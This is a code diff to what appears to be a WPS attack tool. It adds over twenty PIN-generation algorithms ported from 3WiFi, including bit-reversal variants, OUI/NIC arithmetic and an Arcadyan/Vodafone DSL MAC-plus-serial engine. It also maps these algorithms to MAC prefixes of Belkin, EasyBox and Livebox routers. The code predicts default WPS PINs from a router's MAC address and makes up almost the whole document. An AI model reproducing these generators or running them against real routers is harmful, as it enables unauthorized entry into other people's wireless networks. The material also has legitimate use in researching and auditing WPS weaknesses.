@@ -278,10 +278,11 @@ class NetworkAddress:
 class WPSpin:
     """WPS pin generator"""
     def __init__(self):
-        self.ALGO_MAC = 0
-        self.ALGO_EMPTY = 1
-        self.ALGO_STATIC = 2
-        self.ALGO_STATIC_DB = 3
+        self.ALGO_MAC = 0       # PIN computed purely from MAC address
+        self.ALGO_EMPTY = 1     # Empty / blank PIN
+        self.ALGO_STATIC = 2    # Hardcoded static PIN value
+        self.ALGO_STATIC_DB = 3 # Static PIN(s) loaded from pins.csv at runtime
+        self.ALGO_MACSN = 4     # PIN computed from MAC + serial number (SN='' fallback)
 
         self.algos = {
             'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
@@ -390,7 +391,46 @@ class WPSpin:
             'pinArris': {'name': 'Arris', 'mode': self.ALGO_MAC, 'gen': self.pinArris},
             'pinTrendNet': {'name': 'TrendNet', 'mode': self.ALGO_MAC, 'gen': self.pinTrendNet},
             # CSV database-backed static PINs (loaded per-MAC at runtime)
-            'pinGeneric': {'name': 'Static (DB)', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: '', 'static': []}}
+            'pinGeneric': {'name': 'Static (DB)', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: '', 'static': []},
+
+            # ── 3WiFi extended algorithms (ported from 3wifi-wpspin) ─────────────
+
+            # Extended bit-range variants (whole MAC integer truncated)
+            'pin36':  {'name': '36-bit PIN',          'mode': self.ALGO_MAC, 'gen': self.pin36},
+            'pin40':  {'name': '40-bit PIN',          'mode': self.ALGO_MAC, 'gen': self.pin40},
+            'pin44':  {'name': '44-bit PIN',          'mode': self.ALGO_MAC, 'gen': self.pin44},
+            'pin48':  {'name': '48-bit PIN',          'mode': self.ALGO_MAC, 'gen': self.pin48},
+
+            # Byte-reversal variants
+            'pin24rh': {'name': 'Reverse-byte 24-bit', 'mode': self.ALGO_MAC, 'gen': self.pin24rh},
+            'pin32rh': {'name': 'Reverse-byte 32-bit', 'mode': self.ALGO_MAC, 'gen': self.pin32rh},
+            'pin48rh': {'name': 'Reverse-byte 48-bit', 'mode': self.ALGO_MAC, 'gen': self.pin48rh},
+
+            # Nibble-reversal variants
+            'pin24rn': {'name': 'Reverse-nibble 24-bit', 'mode': self.ALGO_MAC, 'gen': self.pin24rn},
+            'pin32rn': {'name': 'Reverse-nibble 32-bit', 'mode': self.ALGO_MAC, 'gen': self.pin32rn},
+            'pin48rn': {'name': 'Reverse-nibble 48-bit', 'mode': self.ALGO_MAC, 'gen': self.pin48rn},
+
+            # Bit-reversal variants
+            'pin24rb': {'name': 'Reverse-bits 24-bit', 'mode': self.ALGO_MAC, 'gen': self.pin24rb},
+            'pin32rb': {'name': 'Reverse-bits 32-bit', 'mode': self.ALGO_MAC, 'gen': self.pin32rb},
+            'pin48rb': {'name': 'Reverse-bits 48-bit', 'mode': self.ALGO_MAC, 'gen': self.pin48rb},
+
+            # NIC arithmetic
+            'pinInvNIC':    {'name': 'Inv NIC to PIN', 'mode': self.ALGO_MAC, 'gen': self.pinInvNIC},
+            'pinNIC2':      {'name': 'NIC * 2',        'mode': self.ALGO_MAC, 'gen': self.pinNIC2},
+            'pinNIC3':      {'name': 'NIC * 3',        'mode': self.ALGO_MAC, 'gen': self.pinNIC3},
+
+            # OUI ↔ NIC arithmetic
+            'pinOUIaddNIC': {'name': 'OUI + NIC',      'mode': self.ALGO_MAC, 'gen': self.pinOUIaddNIC},
+            'pinOUIsubNIC': {'name': 'OUI - NIC',      'mode': self.ALGO_MAC, 'gen': self.pinOUIsubNIC},
+            'pinOUIxorNIC': {'name': 'OUI ^ NIC',      'mode': self.ALGO_MAC, 'gen': self.pinOUIxorNIC},
+
+            # MAC+SN algorithms (Arcadyan/Vodafone DSL engine — SN='' uses MAC-derived fallback)
+            'pinBelkin':     {'name': 'Belkin',            'mode': self.ALGO_MACSN, 'gen': self.pinBelkin},
+            'pinEasyBoxDSL': {'name': 'EasyBox DSL',       'mode': self.ALGO_MACSN, 'gen': self.pinEasyBoxDSL},
+            'pinLivebox':    {'name': 'Livebox Arcadyan',  'mode': self.ALGO_MACSN, 'gen': self.pinLivebox},
+        }
 
 
     @staticmethod
@@ -417,7 +457,12 @@ class WPSpin:
         mac = NetworkAddress(mac)
         if algo not in self.algos:
             raise ValueError(f'{err} Invalid WPS pin algorithm')
-        pin = self.algos[algo]['gen'](mac)
+        algo_entry = self.algos[algo]
+        # ALGO_MACSN: pass mac integer + empty serial number (no SN from WPS scan)
+        if algo_entry['mode'] == self.ALGO_MACSN:
+            pin = algo_entry['gen'](mac, '')
+        else:
+            pin = algo_entry['gen'](mac)
         # If the generator already returned a string (pre-formatted with checksum
         # or an empty placeholder), return it directly — do NOT run the integer
         # checksum pipeline on it, which would raise a TypeError.
@@ -571,10 +616,16 @@ class WPSpin:
             'pinONO': ('5C353B', 'DC537C'),
             # TrendNet routers
             'pinTrendNet': ('0014D1', '001FD0', 'C87F54', '4CAEDE'),
-            # EasyBox / Arcadyan routers
+            # EasyBox / Arcadyan routers (custom algo)
             'pinEasybox': ('00223F', '0016E8', 'BCF685', 'C0E6C7', 'EC43F6'),
             # Arris cable routers
             'pinArris': ('0016B6', 'AC8874', '1CC5D6', '001BC0'),
+            # ── 3WiFi MACSN algorithms ────────────────────────────────────────
+            'pinBelkin':     ('08863B', '94103E', 'B4750E', 'C05627', 'EC1A59'),
+            'pinEasyBoxDSL': ('00264D', '38229D', '7C4FB5'),
+            'pinLivebox':    ('1883BF', '488D36', '4C09D4', '507E5D', '5CDC96',
+                              '743170', '849CA6', '880355', '9C80DF', 'A8D3F7',
+                              'D0052A', 'D463FE'),
         }
         res = []
         for algo_id, masks in algorithms.items():
@@ -706,6 +757,196 @@ class WPSpin:
         fibsum = (fibsum % 10000000 * 10) + self.checksum(fibsum)
 
         return f"{fibsum:08d}"
+
+    # ── 3WiFi extended algorithms ──────────────────────────────────────────────
+
+    # --- Extended bit-range variants ---
+    def pin36(self, mac):
+        return mac.integer % 0x1000000000
+
+    def pin40(self, mac):
+        return mac.integer % 0x10000000000
+
+    def pin44(self, mac):
+        return mac.integer % 0x100000000000
+
+    def pin48(self, mac):
+        return mac.integer
+
+    # --- Byte-reversal variants ---
+    def pin24rh(self, mac):
+        s = format(mac.integer & 0xFFFFFF, '06X')
+        return int(s[4:6] + s[2:4] + s[0:2], 16)
+
+    def pin32rh(self, mac):
+        s = format(mac.integer % 0x100000000, '08X')
+        return int(s[6:8] + s[4:6] + s[2:4] + s[0:2], 16)
+
+    def pin48rh(self, mac):
+        s = format(mac.integer, '012X')
+        return int(s[10:12] + s[8:10] + s[6:8] + s[4:6] + s[2:4] + s[0:2], 16)
+
+    # --- Nibble-reversal variants ---
+    def pin24rn(self, mac):
+        s = format(mac.integer & 0xFFFFFF, '06X')
+        return int(s[::-1], 16)
+
+    def pin32rn(self, mac):
+        s = format(mac.integer % 0x100000000, '08X')
+        return int(s[::-1], 16)
+
+    def pin48rn(self, mac):
+        s = format(mac.integer, '012X')
+        return int(s[::-1], 16)
+
+    # --- Bit-reversal variants ---
+    def pin24rb(self, mac):
+        b = format(mac.integer & 0xFFFFFF, '024b')
+        return int(b[::-1], 2)
+
+    def pin32rb(self, mac):
+        b = format(mac.integer % 0x100000000, '032b')
+        return int(b[::-1], 2)
+
+    def pin48rb(self, mac):
+        b = format(mac.integer, '048b')
+        return int(b[::-1], 2)
+
+    # --- NIC arithmetic ---
+    def pinInvNIC(self, mac):
+        return (~mac.integer) & 0xFFFFFF
+
+    def pinNIC2(self, mac):
+        return (mac.integer & 0xFFFFFF) * 2
+
+    def pinNIC3(self, mac):
+        return (mac.integer & 0xFFFFFF) * 3
+
+    # --- OUI ↔ NIC arithmetic ---
+    def pinOUIaddNIC(self, mac):
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (oui + nic) % 0x1000000
+
+    def pinOUIsubNIC(self, mac):
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        if nic < oui:
+            return oui - nic
+        return (oui + 0x1000000 - nic) & 0xFFFFFF
+
+    def pinOUIxorNIC(self, mac):
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return oui ^ nic
+
+    # --- Universal Arcadyan/Vodafone DSL engine (ported from 3WiFi by Stas'M) ---
+    @staticmethod
+    def _algo_dsl_mac_sn(mac_int, sn='', init=None):
+        """
+        Derive a WPS PIN from MAC address and optional serial number.
+        Powers Belkin, EasyBox DSL, and Livebox Arcadyan algorithms.
+        When SN is empty the algorithm falls back to a MAC-derived value.
+        """
+        if init is None:
+            init = {}
+        if not sn:
+            sn = ''
+        # Pad or truncate SN to exactly 4 hex-character positions
+        sn = sn.zfill(4) if len(sn) < 4 else sn[-4:]
+        # SN chars → nibbles (0 for any non-hex character)
+        sn_nibbles = []
+        for c in sn:
+            try:
+                sn_nibbles.append(int(c, 16))
+            except ValueError:
+                sn_nibbles.append(0)
+        # Last 4 nibbles from MAC integer
+        nic = [
+            (mac_int & 0xFFFF) >> 12,
+            (mac_int & 0xFFF) >> 8,
+            (mac_int & 0xFF) >> 4,
+            mac_int & 0xF,
+        ]
+        bk1      = init.get('bk1', 60)
+        bk2      = init.get('bk2', 195)
+        k1_init  = init.get('k1', 0)
+        k2_init  = init.get('k2', 0)
+        pin_init = init.get('pin', 0)
+        xor_init = init.get('xor', 0)
+        sub_mode = init.get('sub', 0)
+        sk       = init.get('sk', 0)
+        skv      = init.get('skv', 0)
+        bx       = init.get('bx', [])
+        # Compute mixing keys k1 and k2
+        k1, i = k1_init & 0xF, 0
+        bk1c = bk1
+        while bk1c:
+            if bk1c & 1:
+                k1 += nic[i] if i < 4 else sn_nibbles[i - 4]
+                k1 &= 0xF
+            bk1c >>= 1
+            i += 1
+        k2, i = k2_init & 0xF, 0
+        bk2c = bk2
+        while bk2c:
+            if bk2c & 1:
+                k2 += nic[i] if i < 4 else sn_nibbles[i - 4]
+                k2 &= 0xF
+            bk2c >>= 1
+            i += 1
+        # Build PIN nibble-by-nibble using the bx control word list
+        pin = pin_init
+        for bx_val in bx:
+            xor, i, bx_copy = xor_init & 0xF, 0, bx_val
+            while bx_copy:
+                if bx_copy & 1:
+                    if i > 4:
+                        xor ^= sn_nibbles[i - 4]
+                    elif i > 1:
+                        xor ^= nic[i - 1]
+                    elif i > 0:
+                        xor ^= k2
+                    else:
+                        xor ^= k1
+                bx_copy >>= 1
+                i += 1
+            pin = (pin << 4) | xor
+        if sub_mode == 1:
+            mult = k2 if sk > 1 else (k1 if sk > 0 else skv)
+            return (pin % 10000000) - ((pin // 10000000) * mult)
+        elif sub_mode == 2:
+            mult = k2 if sk > 1 else (k1 if sk > 0 else skv)
+            return (pin % 10000000) + ((pin // 10000000) * mult)
+        return pin % 10000000
+
+    def pinBelkin(self, mac, sn=''):
+        """Belkin WPS PIN — Arcadyan DSL engine variant."""
+        return self._algo_dsl_mac_sn(
+            mac.integer, sn,
+            {'bx': [66, 129, 209, 10, 24, 3, 39]}
+        )
+
+    def pinEasyBoxDSL(self, mac, sn=''):
+        """
+        Vodafone EasyBox WPS PIN (accurate 3WiFi version).
+        When SN is unknown, uses last-4-digits of MAC integer as SN string.
+        """
+        if not sn:
+            sn = str(mac.integer & 0xFFFF)
+        return self._algo_dsl_mac_sn(
+            mac.integer, sn,
+            {'bx': [129, 65, 6, 10, 136, 80, 33]}
+        )
+
+    def pinLivebox(self, mac, sn=''):
+        """Livebox Arcadyan WPS PIN — same engine as EasyBox but on MAC-2."""
+        return self._algo_dsl_mac_sn(
+            mac.integer - 2, sn,
+            {'bx': [129, 65, 6, 10, 136, 80, 33]}
+        )
+
+    # ── End 3WiFi extended algorithms ─────────────────────────────────────────
 
 
 def recvuntil(pipe, what):
